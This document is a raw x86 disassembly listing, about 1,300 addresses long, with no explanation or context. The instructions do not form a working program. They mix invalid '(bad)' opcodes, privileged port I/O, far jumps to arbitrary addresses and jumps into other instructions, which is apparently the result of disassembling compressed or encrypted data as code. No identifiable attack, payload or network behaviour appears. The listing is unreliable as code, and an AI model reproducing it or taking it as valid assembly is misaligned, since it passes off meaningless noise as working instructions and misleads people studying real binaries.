  41ff66:	cld    
  41ff67:	outs   dx,BYTE PTR ds:[esi]
  41ff68:	sar    esi,cl
  41ff6a:	dec    esp
  41ff6b:	lods   al,BYTE PTR ds:[esi]
  41ff6c:	xchg   DWORD PTR [edx+0x4b98799],esp
  41ff72:	test   BYTE PTR [edi+0x1aa59f30],cl
  41ff78:	pop    ecx
  41ff79:	out    dx,eax
  41ff7a:	scas   al,BYTE PTR es:[edi]
  41ff7b:	sub    BYTE PTR [ebx-0x3e87cef7],0x52
  41ff82:	out    dx,eax
  41ff83:	pushf  
  41ff84:	call   0x776511d5
  41ff89:	xchg   ecx,eax
  41ff8a:	push   ebx
  41ff8b:	push   0x7ca8a975
  41ff90:	sbb    ebx,ebx
  41ff92:	jnp    0x41ffa8
  41ff94:	mov    ebx,DWORD PTR ds:0x1baba8b6
  41ff9a:	mov    al,bh
  41ff9c:	inc    ecx
  41ff9d:	dec    ebx
  41ff9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff9f:	pop    ebx
  41ffa0:	iret   
  41ffa1:	jae    0x41ff60
  41ffa3:	or     cl,BYTE PTR [ebp+0x58]
  41ffa6:	into   
  41ffa7:	push   es
  41ffa8:	adc    dl,BYTE PTR [esi+0x68]
  41ffab:	dec    esi
  41ffac:	cmp    al,0x6f
  41ffae:	push   esp
  41ffaf:	add    esi,edx
  41ffb1:	fwait
  41ffb2:	xchg   esi,eax
  41ffb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffb4:	in     eax,dx
  41ffb5:	adc    cl,BYTE PTR [ebp+0x46e6b5ad]
  41ffbb:	jne    0x41ff75
  41ffbd:	jmp    0x26ef:0xe06f3914
  41ffc4:	mov    dh,0xdc
  41ffc6:	add    BYTE PTR [ebx],ch
  41ffc8:	sbb    eax,DWORD PTR [ecx+0x2ade23d9]
  41ffce:	push   ss
  41ffcf:	push   esp
  41ffd0:	push   ebx
  41ffd1:	ja     0x41ff5a
  41ffd3:	pop    eax
  41ffd4:	lsl    edi,cx
  41ffd7:	mov    WORD PTR [edx+eax*1+0x4f],?
  41ffdb:	les    eax,FWORD PTR [edi]
  41ffdd:	stos   DWORD PTR es:[edi],eax
  41ffde:	(bad)  
  41ffdf:	mov    eax,ds:0x946a3894
  41ffe4:	aad    0x2
  41ffe6:	icebp  
  41ffe7:	and    DWORD PTR [ebx-0x1cd1d7cb],ebp
  41ffed:	or     eax,0x93c17095
  41fff2:	loop   0x41ffa7
  41fff4:	xor    cl,BYTE PTR [ebx]
  41fff6:	ins    BYTE PTR es:[edi],dx
  41fff7:	leave  
  41fff8:	sub    DWORD PTR [eax+eax*2+0x6502b060],edi
  41ffff:	jno    0x41ffa9
  420001:	push   ebx
  420002:	and    al,BYTE PTR [esi-0x2a7942e2]
  420008:	pop    ebx
  420009:	dec    edx
  42000a:	test   eax,0x5044f9c5
  42000f:	call   0x4f7a300c
  420014:	jle    0x41ffe1
  420016:	push   ebp
  420017:	cld    
  420018:	dec    esi
  420019:	inc    eax
  42001a:	and    DWORD PTR [edx+0x61],edi
  42001d:	mov    eax,fs
  42001f:	ret    0x5083
  420022:	pop    edx
  420023:	call   0xe7dd:0xbbf0d5b5
  42002a:	jmp    0xc47f82ba
  42002f:	push   esi
  420030:	das    
  420031:	ja     0x42006d
  420033:	push   0xe0fb30ea
  420038:	cmp    DWORD PTR [ebp+0x69c9ae7a],esi
  42003e:	push   es
  42003f:	fnstsw WORD PTR ds:0x5c1a8de1
  420045:	icebp  
  420046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420047:	jmp    0xb83:0xaded982a
  42004e:	in     eax,0x83
  420050:	les    edi,FWORD PTR [ebp+0x71]
  420053:	push   es
  420054:	(bad)  
  420055:	or     dl,BYTE PTR [ebp+eax*1-0x74eb9103]
  42005c:	sbb    eax,ebp
  42005e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42005f:	mov    esi,0x55d8591c
  420064:	push   esi
  420065:	inc    ebx
  420066:	sub    DWORD PTR [esi],esi
  420068:	push   edi
  420069:	mov    BYTE PTR cs:[di+0x2c],al
  42006e:	cwde   
  42006f:	mov    eax,ds:0x837473e7
  420074:	mov    ds:0xba368617,eax
  420079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42007a:	inc    esp
  42007b:	sbb    al,BYTE PTR [eax+0x73]
  42007e:	icebp  
  42007f:	fadd   QWORD PTR [eax-0x1954d559]
  420085:	push   0x6d7b00eb
  42008a:	in     al,0x92
  42008c:	ss jae 0x420048
  42008f:	mov    ecx,0xdd0eb869
  420094:	out    0x3b,eax
  420096:	ds aam 0xf4
  420099:	mov    edi,0x44528c9a
  42009e:	popa   
  42009f:	inc    edi
  4200a0:	call   0x6962:0x78b94bea
  4200a7:	(bad)  
  4200a9:	adc    eax,0x2575329c
  4200ae:	mov    edi,0xaa63caa8
  4200b3:	and    al,0xf7
  4200b5:	outs   dx,DWORD PTR ds:[esi]
  4200b6:	mov    ch,BYTE PTR [ebx+edi*4-0x21]
  4200ba:	push   edx
  4200bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200bc:	push   0x176db191
  4200c1:	sub    edi,DWORD PTR [ebp+0x632c8eca]
  4200c7:	out    0xc9,eax
  4200c9:	jp     0x420079
  4200cb:	sub    eax,DWORD PTR [eax+ebx*1-0x4c785f24]
  4200d2:	inc    ecx
  4200d3:	mov    cl,BYTE PTR [edi+0x603aed8f]
  4200d9:	mov    esp,0xa82b7b95
  4200de:	int    0x18
  4200e0:	dec    eax
  4200e1:	enter  0xab08,0xf3
  4200e5:	mov    bl,0xde
  4200e7:	(bad)  
  4200e8:	scas   al,BYTE PTR es:[edi]
  4200e9:	sbb    bh,al
  4200eb:	outs   dx,DWORD PTR ds:[esi]
  4200ec:	enter  0xa03b,0x98
  4200f0:	out    0xf5,al
  4200f2:	cmp    al,0xbe
  4200f4:	xor    eax,0x3d733301
  4200f9:	adc    dh,BYTE PTR [esi]
  4200fb:	or     BYTE PTR [edi-0x4f2c9804],bl
  420101:	inc    esp
  420102:	push   edi
  420103:	out    dx,ax
  420105:	push   ss
  420106:	je     0x42012d
  420108:	add    DWORD PTR [eax],0x4
  42010b:	lea    edi,ds:0x94bce901
  420111:	mov    ds,WORD PTR [esp+edi*2-0x30]
  420115:	fbstp  TBYTE PTR [ebx+0x5b]
  420118:	cmp    eax,0xcd78bc98
  42011d:	(bad)  
  42011e:	cld    
  42011f:	pop    ss
  420120:	or     edi,0x385e51a9
  420126:	inc    esi
  420127:	pop    ds
  420128:	lds    eax,FWORD PTR ss:[edx]
  42012b:	inc    edi
  42012c:	dec    edi
  42012d:	jl     0x420168
  42012f:	stos   BYTE PTR es:[edi],al
  420130:	out    dx,eax
  420131:	push   0x241de05e
  420136:	cmp    al,0x21
  420138:	jmp    ebx
  42013a:	mov    dl,0x2c
  42013c:	mov    edi,0x55f67c7a
  420141:	xor    al,0xc5
  420143:	fcomp  QWORD PTR [edi+ebx*1-0x44]
  420147:	sbb    eax,0x22f4d886
  42014c:	adc    BYTE PTR ds:0xf922bfdb,0x86
  420153:	(bad)  
  420154:	loop   0x420103
  420156:	rcr    DWORD PTR [esp+ebp*8],cl
  420159:	fisubr WORD PTR [ebx+0x6f]
  42015c:	push   0xffffff8d
  42015e:	push   ss
  42015f:	addr16 push ebp
  420161:	mov    WORD PTR [edx-0x16a60b65],gs
  420167:	addr16 pop esp
  420169:	mov    ah,BYTE PTR [edx]
  42016b:	fstcw  WORD PTR [edx-0x3e]
  42016f:	(bad)  
  420170:	pop    ss
  420171:	dec    ecx
  420172:	scas   al,BYTE PTR es:[edi]
  420173:	repz mov ecx,0x9fb1451c
  420179:	in     al,0xa0
  42017b:	mov    edi,0x845e26dc
  420180:	loopne 0x420109
  420182:	jbe    0x42014e
  420184:	or     DWORD PTR [eax+eiz*8-0x47],ebp
  420188:	nop
  420189:	lods   al,BYTE PTR ds:[esi]
  42018a:	xchg   ebx,eax
  42018b:	test   BYTE PTR [esi+0x71],bl
  42018e:	jmp    0x4201fa
  420190:	fdivr  DWORD PTR [ebx]
  420192:	or     al,0x87
  420194:	xchg   eax,ecx
  420196:	dec    edi
  420197:	jne    0x420187
  420199:	test   BYTE PTR [edx],ch
  42019b:	clc    
  42019c:	aaa    
  42019d:	lods   al,BYTE PTR ds:[esi]
  42019e:	or     al,0xb9
  4201a0:	mov    ebx,0xd92a06de
  4201a5:	int3   
  4201a6:	mov    WORD PTR [edx+0x6261fc6c],es
  4201ac:	or     al,0xd
  4201ae:	addr16 pop ebp
  4201b0:	mov    ds:0x153dd6a8,al
  4201b5:	js     0x420225
  4201b7:	jb     0x4201b9
  4201b9:	fnsave [eax+0x38]
  4201bc:	shr    BYTE PTR [edi-0x7cf40279],1
  4201c2:	adc    al,BYTE PTR [ebp-0x1a4cff5a]
  4201c8:	push   eax
  4201c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ca:	sti    
  4201cb:	fstp   TBYTE PTR [esi-0x41]
  4201ce:	nop
  4201cf:	add    BYTE PTR [edx],bh
  4201d1:	mov    esp,0x719d3262
  4201d6:	push   ebp
  4201d7:	les    edx,FWORD PTR [ebp-0x26]
  4201da:	push   0x9227a5a4
  4201df:	adc    eax,0xac6e5a9d
  4201e4:	jmp    0x4201fa
  4201e6:	mov    eax,0x28c6b755
  4201eb:	sub    ah,BYTE PTR ds:0x28d7bf10
  4201f1:	jne    0x42022c
  4201f3:	mov    eax,ds:0xf1ba6cfb
  4201f8:	jnp    0x420212
  4201fa:	cmc    
  4201fb:	bts    DWORD PTR [edx+ebp*1-0x7216a48e],eax
  420203:	jecxz  0x42024f
  420205:	aaa    
  420206:	stc    
  420207:	arpl   WORD PTR [eax-0x58],bp
  42020a:	add    eax,DWORD PTR [esi+0x33]
  42020d:	inc    esp
  42020e:	es or  edx,0xfffffffa
  420212:	jmp    0x90aeae87
  420217:	adc    edx,esi
  420219:	mov    esp,0x53031e72
  42021e:	call   0x545674d1
  420223:	xchg   BYTE PTR [ecx+0x7],dl
  420226:	xchg   DWORD PTR [ebp+eiz*1+0x4594c5e4],esi
  42022d:	push   ecx
  42022e:	mov    esp,0xd6b59f01
  420233:	dec    ebx
  420234:	(bad)  
  420235:	pop    ecx
  420236:	test   DWORD PTR [esi],ebp
  420238:	sahf   
  420239:	lock inc ebx
  42023b:	mov    eax,ds:0xf847111f
  420240:	sub    eax,0x36df6a49
  420245:	adc    cl,dh
  420247:	jecxz  0x420220
  420249:	je     0x4202a2
  42024b:	scas   al,BYTE PTR es:[edi]
  42024c:	inc    esi
  42024d:	xchg   edi,esi
  42024f:	es mov eax,0x779c1a0b
  420255:	push   es
  420256:	imul   edx,DWORD PTR [edi+0x1e4cfb91],0x85cfe595
  420260:	fbld   TBYTE PTR [eax-0x44]
  420263:	mov    eax,0x260b2d48
  420268:	loopne 0x42021c
  42026a:	scas   eax,DWORD PTR es:[edi]
  42026b:	(bad)  
  42026c:	ins    BYTE PTR es:[edi],dx
  42026d:	xchg   esp,eax
  42026e:	sub    eax,0xa69e70fa
  420273:	sub    DWORD PTR [eax],esp
  420275:	and    ch,BYTE PTR [edx-0x74]
  420278:	das    
  420279:	dec    ebp
  42027a:	bound  edi,QWORD PTR [eax]
  42027c:	shl    edx,0xdf
  42027f:	sti    
  420280:	cmp    edi,DWORD PTR [eax+0x12d0439c]
  420286:	xchg   esp,esi
  420288:	sbb    bh,BYTE PTR [esi+ecx*1+0x7c]
  42028c:	leave  
  42028d:	mov    ds:0x203aa978,eax
  420292:	xchg   ecx,eax
  420293:	push   0xffffffb9
  420295:	sbb    al,0x80
  420297:	or     al,al
  420299:	pop    ebx
  42029a:	inc    ebp
  42029b:	or     ebp,DWORD PTR [esi]
  42029d:	and    cl,BYTE PTR [edi-0x5e]
  4202a0:	cli    
  4202a1:	scas   al,BYTE PTR es:[edi]
  4202a2:	ficomp DWORD PTR [edi+0x70]
  4202a5:	call   0xf740e02f
  4202aa:	lods   eax,DWORD PTR ds:[esi]
  4202ab:	mov    al,BYTE PTR [edi]
  4202ad:	loope  0x420232
  4202af:	popf   
  4202b0:	cmp    BYTE PTR [eax+0x7],0xe7
  4202b4:	inc    esi
  4202b5:	mov    bl,0x34
  4202b7:	or     ah,BYTE PTR [edi+0x42]
  4202ba:	pop    ss
  4202bb:	mov    esi,DWORD PTR [esi-0x74ac2dce]
  4202c1:	mov    dh,0xb2
  4202c3:	jg     0x4202d1
  4202c5:	les    ecx,FWORD PTR [eax+ecx*2+0x607ce252]
  4202cc:	mov    ecx,0xaa5121af
  4202d1:	mov    ebx,0xdd0826b5
  4202d6:	cmp    dl,dh
  4202d8:	push   esp
  4202d9:	pop    ebx
  4202da:	(bad)  
  4202db:	retf   0x3071
  4202de:	mul    cl
  4202e0:	sbb    bh,dh
  4202e2:	add    ch,BYTE PTR [eax]
  4202e4:	mov    bh,0x45
  4202e6:	push   ecx
  4202e7:	cmc    
  4202e8:	cmp    DWORD PTR [edi-0x1b54e54],0x5a668830
  4202f2:	mov    ch,0x21
  4202f4:	mov    al,ds:0x351b624
  4202f9:	push   0x64
  4202fb:	dec    edi
  4202fc:	mov    dh,0xe9
  4202fe:	js     0x420364
  420300:	mov    dh,0x4
  420302:	or     DWORD PTR [ebx+0x20],ebx
  420305:	int3   
  420306:	jmp    0xd32e:0xac284bcc
  42030d:	loopne 0x4202be
  42030f:	mul    BYTE PTR [esi]
  420311:	inc    edx
  420312:	ja     0x4202f8
  420314:	aaa    
  420315:	lea    ebx,[esi]
  420317:	(bad)  
  420319:	frstor [edi+0x359d42fb]
  42031f:	push   eax
  420320:	cmp    DWORD PTR [edi+edi*8+0x63ba044a],esp
  420327:	(bad)  
  420328:	fld    QWORD PTR [esi+0x7a]
  42032b:	push   ebp
  42032c:	add    eax,0x9914109c
  420331:	dec    edi
  420332:	jns    0x4202cc
  420334:	bound  edi,QWORD PTR [esi+ecx*4+0x5d]
  420338:	fldenv [ecx]
  42033a:	xchg   ebp,eax
  42033b:	stos   DWORD PTR es:[edi],eax
  42033c:	lock add DWORD PTR [edi+0x20],edx
  420340:	jb     0x42035f
  420342:	xchg   DWORD PTR [edi],esp
  420344:	retf   0x6a82
  420347:	ds dec esi
  420349:	pop    eax
  42034a:	mov    ecx,DWORD PTR [esp+edx*2]
  42034d:	pop    ebp
  42034e:	jnp    0x420364
  420350:	fcmovne st,st(2)
  420352:	mov    ds:0x42fd90ba,eax
  420357:	cmp    eax,0xd96a068e
  42035c:	adc    eax,DWORD PTR ds:[ecx+0x50]
  420360:	or     eax,DWORD PTR [esi-0x6f02ad90]
  420366:	lock aam 0x4f
  420369:	push   ecx
  42036a:	loope  0x42035f
  42036c:	rol    eax,0x4
  42036f:	retf   0xcf78
  420372:	mov    ah,0x11
  420374:	sbb    ah,BYTE PTR [edx]
  420376:	mov    edi,0x33400a8f
  42037b:	or     BYTE PTR [ecx-0x49a01976],dh
  420381:	cmp    al,0x84
  420383:	sub    ecx,DWORD PTR [edx+0x62f670aa]
  420389:	lea    ecx,[edi-0x62]
  42038c:	nop
  42038d:	add    al,0x69
  42038f:	pop    ebx
  420390:	mul    DWORD PTR [edx-0x56270be9]
  420396:	sar    DWORD PTR [eax+0x48],0xab
  42039a:	xchg   ecx,eax
  42039b:	cmc    
  42039c:	bound  eax,QWORD PTR [ebp-0xc]
  42039f:	aam    0xee
  4203a1:	stc    
  4203a2:	sti    
  4203a3:	test   DWORD PTR [esi+edi*1+0x7c],ebx
  4203a7:	inc    esp
  4203a8:	adc    dh,BYTE PTR [edx]
  4203aa:	mov    ebx,0xab24b90a
  4203af:	and    eax,0xc1587f42
  4203b4:	imul   ebx,esi,0x92e92c5
  4203ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203bb:	mov    cs,WORD PTR [esi+0x2e187bff]
  4203c1:	pop    esp
  4203c2:	ss inc eax
  4203c4:	push   ss
  4203c5:	sub    DWORD PTR [esi+0x3f],ecx
  4203c8:	mov    al,0x1b
  4203ca:	dec    edi
  4203cb:	jb     0x420393
  4203cd:	out    dx,al
  4203ce:	js     0x420409
  4203d0:	sub    ch,ch
  4203d2:	add    DWORD PTR [edx+0x50e0b697],edx
  4203d8:	mov    DWORD PTR [edx-0x1cc4db2b],edx
  4203de:	fnstenv [esi]
  4203e0:	push   cs
  4203e1:	mov    edx,0x94bb0631
  4203e6:	inc    ebx
  4203e7:	xor    eax,0x257483c5
  4203ec:	dec    ebp
  4203ed:	out    0xcf,eax
  4203ef:	pop    esp
  4203f0:	or     eax,0x7019df53
  4203f5:	std    
  4203f6:	cmp    esi,edi
  4203f8:	push   edx
  4203f9:	sub    ebp,DWORD PTR [edx-0x9ebd84b]
  4203ff:	dec    ecx
  420400:	aam    0x1a
  420402:	pusha  
  420403:	pop    edi
  420404:	and    dh,BYTE PTR [ecx-0x72]
  420407:	sti    
  420408:	add    eax,0xffe68af8
  42040d:	into   
  42040e:	stos   BYTE PTR es:[edi],al
  42040f:	pusha  
  420410:	(bad)  
  420411:	lock add eax,0x9670dc06
  420417:	out    dx,eax
  420418:	ja     0x420499
  42041a:	and    al,0x2a
  42041c:	xchg   DWORD PTR [ebp-0x49647009],ebx
  420422:	push   ebp
  420423:	lock cdq 
  420425:	jnp    0x420498
  420427:	not    DWORD PTR [ebx-0x44]
  42042a:	jae    0x420418
  42042c:	std    
  42042d:	dec    edi
  42042e:	loope  0x4204a0
  420430:	mov    ecx,0xb83bcb2c
  420435:	inc    esp
  420436:	leave  
  420437:	lods   eax,DWORD PTR ds:[esi]
  420438:	push   edx
  420439:	mov    dl,0x6a
  42043b:	jge    0x4203d2
  42043d:	jns    0x420425
  42043f:	test   BYTE PTR [esp+edx*4],cl
  420442:	lock pop ebp
  420444:	cs jmp 0x2e282845
  42044a:	or     eax,0x90cd6f04
  42044f:	leave  
  420450:	mov    cl,BYTE PTR ds:0xa5359fb
  420456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420457:	dec    ebx
  420458:	es push es
  42045a:	push   0xa5f93485
  42045f:	int    0xc
  420461:	aam    0x9f
  420463:	popf   
  420464:	push   eax
  420465:	cdq    
  420466:	in     eax,0x62
  420468:	sbb    eax,0xc609a181
  42046d:	int    0x19
  42046f:	icebp  
  420470:	add    ecx,ebp
  420472:	addr16 jb 0x420403
  420475:	push   ebx
  420476:	lds    eax,FWORD PTR [ecx]
  420478:	xchg   DWORD PTR [edx-0x33],ebp
  42047b:	in     al,dx
  42047c:	stos   BYTE PTR es:[edi],al
  42047d:	lock icebp 
  42047f:	or     BYTE PTR [eax+0x4],dl
  420482:	mov    ecx,0xa6f9bddb
  420487:	jnp    0x420446
  420489:	mov    ch,0xc
  42048b:	or     al,BYTE PTR [edx*1+0x31df60cb]
  420492:	mov    esp,DWORD PTR [eax*2-0x69d05de9]
  420499:	ret    0x5c96
  42049c:	pop    ss
  42049d:	js     0x420506
  42049f:	clc    
  4204a0:	xlat   BYTE PTR ds:[ebx]
  4204a1:	add    dl,BYTE PTR [ecx+0x8]
  4204a4:	pop    esp
  4204a5:	mov    al,ds:0xfade4d98
  4204aa:	push   ds
  4204ab:	inc    esp
  4204ac:	mov    dl,0x77
  4204ae:	xchg   ebp,eax
  4204af:	loopne 0x420499
  4204b1:	xchg   ecx,eax
  4204b2:	adc    eax,0x8a2bc9df
  4204b7:	stc    
  4204b8:	repz or edi,DWORD PTR [ebp+ebp*2+0x473b63f3]
  4204c0:	push   esi
  4204c1:	mov    cl,0x91
  4204c3:	pusha  
  4204c4:	inc    esp
  4204c5:	(bad)  
  4204c6:	rol    bh,0xf4
  4204c9:	pop    ebx
  4204ca:	sub    eax,0xac828e26
  4204cf:	test   eax,0x5124a22e
  4204d4:	xor    BYTE PTR [ebx],bl
  4204d6:	loop   0x420538
  4204d8:	sub    esi,DWORD PTR [edx]
  4204da:	push   0x947f9f24
  4204df:	mov    ds:0xfbd49e65,al
  4204e4:	sbb    eax,0x6ef4e211
  4204e9:	jmp    0x42054a
  4204eb:	leave  
  4204ec:	inc    ebp
  4204ed:	and    al,0x3b
  4204ef:	test   BYTE PTR [eax],dh
  4204f1:	sub    bl,BYTE PTR [eax]
  4204f3:	add    eax,0x19e70c67
  4204f8:	in     eax,0xaa
  4204fa:	pop    ecx
  4204fb:	cld    
  4204fc:	sbb    eax,0xc3527a2e
  420502:	sbb    ebp,DWORD PTR [eax-0x3b]
  420505:	mov    al,ds:0x77e3996d
  42050a:	jp     0x420513
  42050c:	js     0x42051b
  42050e:	jp     0x4204b8
  420510:	push   eax
  420511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420512:	and    DWORD PTR [edx+0x61],ecx
  420515:	jl     0x42054f
  420517:	mov    esp,DWORD PTR [eax-0x7d90dcb9]
  42051d:	mov    ebx,0xdf329509
  420522:	xor    BYTE PTR [eax],dl
  420524:	inc    ebx
  420525:	dec    ebp
  420526:	in     al,dx
  420527:	in     eax,dx
  420528:	dec    esp
  420529:	cmp    cl,BYTE PTR [edi+0x21]
  42052c:	cld    
  42052d:	nop
  42052e:	sbb    eax,0x1b4dbd43
  420533:	scas   eax,DWORD PTR es:[edi]
  420534:	sub    BYTE PTR [edx-0x12dbc93],0xfc
  42053b:	cdq    
  42053c:	icebp  
  42053d:	cmp    BYTE PTR [edx+0x4d37216d],al
  420543:	lods   al,BYTE PTR ds:[esi]
  420544:	aas    
  420545:	aad    0xac
  420547:	push   0x3d298255
  42054c:	pop    ebp
  42054d:	mov    ds:0x55aa6eb5,eax
  420552:	icebp  
  420553:	xor    ebx,DWORD PTR [edx+0x25]
  420556:	shl    bh,1
  420558:	mov    al,dl
  42055a:	push   0xc
  42055c:	loopne 0x420505
  42055e:	jns    0x420522
  420560:	lahf   
  420561:	(bad)  
  420562:	pop    esp
  420563:	mov    esp,0x56c70d36
  420568:	sbb    bh,BYTE PTR [edi+esi*4-0x3d3a9e01]
  42056f:	push   ebp
  420570:	or     cl,ch
  420572:	mov    bl,BYTE PTR [eax-0x54]
  420575:	(bad)  
  420576:	xchg   BYTE PTR [edi],dh
  420578:	cdq    
  420579:	imul   ebx,DWORD PTR [ebx-0x75],0x59161632
  420580:	retf   
  420581:	push   0xffffffb4
  420583:	lods   eax,DWORD PTR ds:[esi]
  420584:	out    0x99,al
  420586:	pop    eax
  420587:	xlat   BYTE PTR ds:[ebx]
  420588:	gs jmp 0x420595
  42058b:	aam    0x8b
  42058d:	(bad)
  420590:	xor    bl,ah
  420592:	popa   
  420593:	and    BYTE PTR [esp+ebx*8],dl
  420596:	ja     0x42058f
  420598:	push   ecx
  420599:	(bad)  
  42059a:	jns    0x42051c
  42059c:	inc    edx
  42059d:	pushf  
  42059e:	arpl   WORD PTR [edi+0x6b],sp
  4205a1:	jecxz  0x42061e
  4205a3:	cs xchg ebp,eax
  4205a5:	scas   al,BYTE PTR es:[edi]
  4205a6:	sub    eax,0x7d687454
  4205ab:	add    al,0xb0
  4205ad:	pop    ebp
  4205ae:	cld    
  4205af:	mov    esi,DWORD PTR [eax+0x48]
  4205b2:	aas    
  4205b3:	push   eax
  4205b4:	(bad)  
  4205b6:	push   es
  4205b7:	sti    
  4205b8:	loopne 0x4205bb
  4205ba:	push   cs
  4205bb:	inc    ebp
  4205bc:	jbe    0x4205b7
  4205be:	add    al,0x4f
  4205c0:	push   ds
  4205c1:	mov    bl,0x43
  4205c3:	adc    ah,BYTE PTR [ebp-0x79]
  4205c6:	mov    esi,fs
  4205c8:	xor    eax,0xf19d7583
  4205cd:	inc    ecx
  4205ce:	sbb    ah,BYTE PTR [eax]
  4205d0:	sub    al,0xe4
  4205d2:	push   es
  4205d3:	repz fwait
  4205d5:	ja     0x4205bd
  4205d7:	xor    al,0x91
  4205d9:	retf   
  4205da:	fdiv   DWORD PTR [ebx+0x47]
  4205dd:	and    BYTE PTR [ebp+0x26],dh
  4205e0:	pop    esi
  4205e2:	in     al,0xee
  4205e4:	pushf  
  4205e5:	add    eax,esp
  4205e7:	or     dh,cl
  4205e9:	aas    
  4205ea:	and    DWORD PTR [esp+ecx*2-0x56],edi
  4205ee:	in     eax,0x4d
  4205f0:	adc    BYTE PTR [ecx-0x47],bl
  4205f3:	test   BYTE PTR [eax-0x7d],dl
  4205f6:	pusha  
  4205f7:	sbb    al,0xde
  4205f9:	jp     0x4205c6
  4205fb:	jns    0x4205d1
  4205fd:	rcr    BYTE PTR [ecx],0xd8
  420600:	mov    ds:0x4f4edbc9,eax
  420605:	in     al,dx
  420606:	dec    eax
  420607:	leave  
  420608:	sub    BYTE PTR [eax],0xaf
  42060b:	mov    BYTE PTR [ecx-0x33],cl
  42060e:	push   cs
  42060f:	sbb    ecx,DWORD PTR [ebp+0x1]
  420612:	sbb    al,0x4d
  420614:	and    DWORD PTR [ecx-0x1d455129],edi
  42061a:	and    al,0x2d
  42061c:	icebp  
  42061d:	xor    edx,DWORD PTR [ebp+ebx*1-0x143d01c4]
  420624:	jmp    0xaf59f31f
  420629:	pusha  
  42062a:	adc    esi,DWORD PTR [ebp+0x1bcdbc1a]
  420630:	add    DWORD PTR [esi],esp
  420632:	fs in  eax,0x3f
  420635:	jl     0x420686
  420637:	mov    edx,0x78401b43
  42063c:	sbb    al,0x1a
  42063e:	pusha  
  42063f:	test   eax,0x4cbc9d89
  420644:	stos   BYTE PTR es:[edi],al
  420645:	pop    ss
  420646:	inc    edx
  420647:	pop    ss
  420648:	cmp    DWORD PTR [eax+0x3cf170b1],esi
  42064e:	cmp    edx,edx
  420650:	fdiv   QWORD PTR [ecx+0x30]
  420653:	adc    ebx,DWORD PTR [eax+0x25]
  420656:	jmp    0x976d:0x278f084d
  42065d:	jbe    0x420654
  42065f:	aas    
  420660:	xchg   DWORD PTR [ecx+ecx*1+0x3f],edx
  420664:	and    esi,DWORD PTR [esi+esi*2-0x1d]
  420668:	es jmp 0x6dcf078d
  42066e:	mov    WORD PTR [ebp-0x34590705],fs
  420674:	test   bl,0x32
  420677:	lahf   
  420678:	and    edi,DWORD PTR [ecx]
  42067a:	mov    al,ds:0xc2793531
  42067f:	mov    al,0x7f
  420681:	and    eax,0x588bdf66
  420686:	fdivp  st(3),st
  420688:	pop    edx
  420689:	cmp    DWORD PTR [ebp+eax*1-0x25],ebp
  42068d:	pop    ecx
  42068e:	dec    ecx
  42068f:	jmp    0xb69a12d5
  420694:	sbb    al,0xa1
  420696:	sub    eax,0x804e8f50
  42069b:	addr16 xor edi,ebx
  42069e:	or     bh,BYTE PTR [edx+0x3e]
  4206a1:	test   DWORD PTR [esi+0x3f],edx
  4206a4:	fnstcw WORD PTR ds:0x177845f
  4206aa:	xchg   ebx,eax
  4206ab:	cli    
  4206ac:	cdq    
  4206ad:	mov    al,0x2
  4206af:	std    
  4206b0:	fnstcw WORD PTR [esi]
  4206b2:	mov    esp,DWORD PTR [ebp-0x2a0d33d1]
  4206b8:	(bad)  
  4206ba:	imul   ebp,esp,0xe727f92d
  4206c0:	pop    ds
  4206c1:	aad    0x62
  4206c3:	inc    esi
  4206c4:	add    bl,BYTE PTR [eax]
  4206c6:	pop    edi
  4206c7:	pop    ss
  4206c8:	sbb    BYTE PTR [ecx+0x39ae8301],0x95
  4206cf:	and    ebx,DWORD PTR [ebp+0x1436c4be]
  4206d5:	mov    esi,0x3925378a
  4206da:	or     al,bl
  4206dc:	xor    ch,BYTE PTR [edx]
  4206de:	mov    bl,0x2e
  4206e0:	rol    dl,1
  4206e2:	jecxz  0x420722
  4206e4:	jmp    0xefac8626
  4206e9:	imul   edi,ebp,0xdf57bd0e
  4206ef:	sub    al,0xf6
  4206f1:	jg     0x420677
  4206f3:	daa    
  4206f4:	jmp    0x420719
  4206f6:	call   0xb0b9:0xb0068e09
  4206fd:	sbb    al,0x86
  4206ff:	xor    esp,DWORD PTR [ebp+0x7f]
  420702:	push   ecx
  420704:	icebp  
  420705:	pusha  
  420706:	cli    
  420707:	pusha  
  420708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420709:	gs data16 jae 0x420759
  42070d:	cldemote BYTE PTR [esi+esi*1+0x67e7e1db]
  420715:	mov    ah,0x8a
  420717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420718:	mov    ecx,esp
  42071a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42071b:	cdq    
  42071c:	arpl   WORD PTR [edx+0x762157a2],bx
  420722:	xchg   esp,eax
  420723:	ins    DWORD PTR es:[edi],dx
  420724:	adc    ah,BYTE PTR [esi+0x35]
  420727:	jne    0x4206eb
  420729:	std    
  42072a:	loop   0x420789
  42072c:	jl     0x42076c
  42072e:	mov    ebx,0xf7deffa2
  420733:	cs stc 
  420735:	push   0xf1411029
  42073a:	mov    dl,0xe2
  42073c:	xor    eax,DWORD PTR [ebp-0x76]
  42073f:	mov    ecx,0x8074eb54
  420744:	dec    edx
  420745:	mov    edx,0x3ae431e7
  42074a:	xchg   esi,eax
  42074b:	loope  0x420709
  42074d:	push   ebp
  42074e:	jno    0x4207c4
  420750:	in     eax,dx
  420751:	test   esp,0x6515cb4d
  420757:	push   0x83bea8b1
  42075c:	mov    ds:0x87a64328,al
  420761:	and    esi,esp
  420763:	push   ecx
  420764:	inc    eax
  420765:	pop    eax
  420766:	or     al,0xad
  420768:	inc    edi
  420769:	stos   BYTE PTR es:[edi],al
  42076a:	add    al,0x8f
  42076c:	enter  0x8093,0x8a
  420770:	or     BYTE PTR ds:0x1f37256e,al
  420776:	in     al,0x8
  420778:	call   0x61427aec
  42077d:	int3   
  42077e:	aam    0x97
  420780:	push   esi
  420781:	adc    BYTE PTR [eax+0x7a],ch
  420784:	jns    0x420752
